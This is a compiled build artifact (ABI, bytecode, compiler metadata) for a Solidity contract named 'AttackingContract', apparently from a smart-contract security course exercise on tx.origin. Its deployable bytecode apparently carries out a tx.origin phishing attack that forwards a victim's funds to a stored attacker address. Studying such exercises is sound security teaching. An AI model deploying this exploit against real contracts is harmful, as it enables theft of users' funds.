{
    "contractName": "AttackingContract",
    "abi": [
        {
            "stateMutability": "nonpayable",
            "type": "fallback"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "myContractAddress",
                    "type": "address"
                }
            ],
            "name": "attackingContract",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ],
    "bytecode": "608060405234801561001057600080fd5b5061012c806100206000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80633b5fdefc146090575b600054600154604051634f0d005560e11b81526001600160a01b03918216600482015233316024820152911690639e1a00aa90604401600060405180830381600087803b158015607757600080fd5b505af1158015608a573d6000803e3d6000fd5b50505050005b60c6609b36600460c8565b600080546001600160a01b039092166001600160a01b03199283161790556001805490911633179055565b005b60006020828403121560d957600080fd5b81356001600160a01b038116811460ef57600080fd5b939250505056fea2646970667358221220c3b1aff4f474b5288e2934b3eb3eac6334bf4ec0e1b7096c26229a4c0cce908464736f6c634300080c0033",
    "sourcePath": "c:/Users/yanni/Documents/Formation Alyra/Solidity_security/contracts/05_TxOrigin.sol",
    "compiler": {
        "name": "solc",
        "version": "0.8.12+commit.f00d7308"
    },
    "functionHashes": {
        "attackingContract(address)": "3b5fdefc"
    },
    "gasEstimates": {
        "creation": {
            "codeDepositCost": "60000",
            "executionCost": "111",
            "totalCost": "60111"
        },
        "external": {
            "": "infinite",
            "attackingContract(address)": "48719"
        }
    }
}